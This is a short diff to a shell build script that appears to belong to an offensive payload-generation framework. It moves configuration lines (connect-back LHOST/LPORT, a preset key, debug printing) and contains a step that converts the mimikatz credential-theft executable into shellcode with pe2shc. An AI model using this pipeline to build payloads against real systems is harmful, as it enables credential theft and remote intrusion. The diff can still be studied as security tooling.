@@ -29,17 +29,15 @@
 # override connect-back settings here, if necessary
 LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
+# no preexec command
+set_command_source no_data
+set_command_exec no_command
+# generate key file
+generate_key preset aabbccddee input/key_raw.txt
 # enable debug print
 enable_debug_print
 #CONFIGURATION_END
 
-
-# no preexec command
-set_command_source no_data
-set_command_exec no_command
-
-# generate key file
-generate_key preset aabbccddee input/key_raw.txt
 
 # convert mimikatz executable into shellcode format
 wine ./../pe_to_shellcode/pe2shc.exe input/mimikatz.exe input/mimikatz.exe.shc
